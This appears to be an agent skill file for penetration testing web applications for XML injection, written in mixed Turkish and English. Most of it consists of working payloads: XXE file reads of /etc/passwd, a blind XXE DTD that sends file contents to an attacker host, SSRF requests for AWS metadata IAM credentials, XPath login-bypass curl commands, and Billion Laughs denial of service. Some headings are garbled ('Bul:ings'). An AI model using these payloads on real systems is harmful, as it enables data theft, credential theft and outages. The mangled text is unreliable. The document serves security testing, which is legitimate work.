---
name: testing-for-xml-injection-vulnerabilities
description: Test web applications for XML injection vulnerabilities including XXE, XPath injection, and XML entity attacks to identify data exposure and server-side request forgery risks.
tags:
- xxe
- web-security
- xml-parsing
- xml-injection
- dtd-attack
- fetih
- web-application-security
- cybersecurity
- xpath-injection
- entity-injection
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- api
- authentication
- cloud
- dns
- endpoint
- exploit
- http
- injection
- log
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing for Xml Injection Vulnerabilities


## Ne Zaman Kullanılır
- testing yaparken applications that process XML input (SOAP APIs, XML-RPC, file uploads)
- During penetration testing of applications with XML parsers
- assessing yaparken SAML-based authentication implementations
- testing yaparken file import/export functionality that handles XML formats
- During API security testing of SOAP or XML-based web services

## Ön Gereksinimler
- Burp Suite with XML-related extensions (Content Type Converter, XXE Scanner)
- XMLLint or similar XML validation tools
- Understanding of XML structure, DTDs, and entity processing
- Python 3.x with lxml and requests libraries
- Erişim: an out-of-band interaction server (Burp Collaborator, interact.sh)
- Sample XXE payloads from PayloadsAllTheThings repository

## İş Akışı

### Adım 1 — Identify XML Processing Endpoints
```bash
curl -s http://target.com/service?wsdl

curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>hello</test></root>'

```

### Adım 2 — Test for Basic XXE (File Retrieval)
```xml
<!-- Basic XXE to read local files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows file retrieval -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>

<!-- Using PHP wrapper for base64-encoded file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Adım 3 — Test for Blind XXE with Out-of-Band Tespit
```xml
<!-- Out-of-band XXE using external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
  %xxe;
]>
<root><data>test</data></root>

<!-- External DTD file (xxe.dtd hosted on attacker server) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?data=%file;'>">
%eval;
%exfil;

<!-- DNS-based out-of-band Tespit -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
]>
<root><data>&xxe;</data></root>
```

### Adım 4 — Test for SSRF via XXE
```xml
<!-- Internal network scanning via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- AWS metadata endpoint access -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>

<!-- Internal port scanning -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root><data>&xxe;</data></root>
```

### Adım 5 — Test for XPath Injection
```bash
curl "http://target.com/search?query=' or '1'='1"

curl -X POST http://target.com/login \
  -d "username=' or '1'='1&password=' or '1'='1"

curl "http://target.com/search?query=' or 1=1 or ''='"

curl "http://target.com/search?query=' or string-length(//user[1]/password)=8 or ''='"
curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' or ''='"
```

### Adım 6 — Test for XML Billion Laughs (DoS)
```xml
<!-- Billion Laughs attack (use only in authorized testing) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root><data>&lol4;</data></root>

<!-- Quadratic blowup attack -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| XXE (XML External Entity) | Attack exploiting XML parsers that process external entity references |
| Blind XXE | XXE where response is not reflected; requires out-of-band channels |
| XPath Injection | Injection into XPath queries used to navigate XML documents |
| DTD (Document Type Definition) | Declarations that define XML document structure and entities |
| Parameter Entities | Special entities (%) used within DTDs for blind XXE exploitation |
| SSRF via XXE | Using XXE to make server-side requests to internal resources |
| XML Bomb | Denial of service via recursive entity expansion (Billion Laughs) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy with XXE Scanner extension for automated Tespit |
| XXEinjector | Automated XXE injection and data exfiltration tool |
| OXML_XXE | Tool for embedding XXE payloads in Office XML documents |
| xmllint | XML validation and parsing utility for payload testing |
| interact.sh | Out-of-band interaction server for blind XXE Tespit |
| Content Type Converter | Burp extension to convert JSON requests to XML for XXE testing |

## Common Scenarios

1. **File Disclosure** — Read sensitive server files (/etc/passwd, web.config) through classic XXE entity injection in XML input fields
2. **SSRF to Cloud Metadata** — Access AWS/GCP/Azure metadata endpoints through XXE to steal IAM credentials and access tokens
3. **Blind Data Exfiltration** — Extract sensitive data through out-of-band DNS/HTTP channels when XXE output is not reflected
4. **SAML XXE** — Inject XXE payloads into SAML assertions during single sign-on authentication flows
5. **SVG File Upload XXE** — Upload malicious SVG files containing XXE payloads to trigger server-side XML parsing

## Output Format

```
## XML Injection Assessment Report
- **Target**: http://target.com/api/xml-endpoint
- **Vulnerability Types Found**: XXE, Blind XXE, XPath Injection
- **Severity**: Critical

### Bul:ings
| # | Type | Endpoint | Payload | Impact |
|---|------|----------|---------|--------|
| 1 | XXE File Read | POST /api/import | SYSTEM "file:///etc/passwd" | Local File Disclosure |
| 2 | Blind XXE | POST /api/upload | External DTD with OOB | Data Exfiltration |
| 3 | SSRF via XXE | POST /api/parse | SYSTEM "http://169.254.169.254/" | Cloud Credential Theft |

### İyileştirme
- Disable external entity processing in XML parser configuration
- Use JSON instead of XML where possible
- Implement XML schema validation with strict DTD restrictions
- Block outbound connections from XML processing services
```
